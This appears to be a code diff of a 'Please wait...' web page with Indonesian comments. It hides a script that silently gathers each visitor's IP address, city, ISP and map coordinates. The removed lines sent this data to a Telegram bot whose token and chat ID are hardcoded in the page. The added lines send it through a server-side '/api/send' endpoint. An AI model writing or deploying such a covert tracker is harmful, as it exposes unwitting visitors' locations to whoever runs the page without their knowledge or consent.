@@ -8,18 +8,10 @@
   <h3>Mohon tunggu...</h3>
 
   <script>
-    // ===== GANTI DENGAN PUNYA KAMU =====
-    const BOT_TOKEN = "8450745041:AAEKdyVwwytSBLPe5zJhCg4cd9TqBDCgB1o"; 
-    const CHAT_ID = "7600526426";
-
     async function getIP() {
       try {
-        const res = await fetch("http://ip-api.com/json/?fields=status,message,query,country,regionName,city,lat,lon,isp,org,as,timezone,zip");
+        const res = await fetch("https://ip-api.com/json/");
         const data = await res.json();
-
-        if (data.status !== "success") {
-          throw new Error(data.message || "Gagal ambil data");
-        }
 
         const info = `
 📡 *IP Terdeteksi*
@@ -31,23 +23,21 @@
 ⚡ ASN: ${data.as}
 ⌚ Zona Waktu: ${data.timezone}
 📌 Koordinat: ${data.lat}, ${data.lon}
-🔗 [Lihat di Maps](https://www.google.com/maps?q=${data.lat},${data.lon})
+🔗 https://www.google.com/maps?q=${data.lat},${data.lon}
         `;
 
-        // kirim ke bot telegram
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        // kirim ke API vercel kamu (server-side)
+        const send = await fetch("/api/send", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: info,
-            parse_mode: "Markdown",
-            disable_web_page_preview: false
-          })
+          body: JSON.stringify({ text: info })
         });
 
+        const result = await send.json();
+        console.log("Result API:", result);
+
       } catch (err) {
-        console.error("Gagal ambil IP:", err);
+        console.error("Error:", err);
       }
     }
 
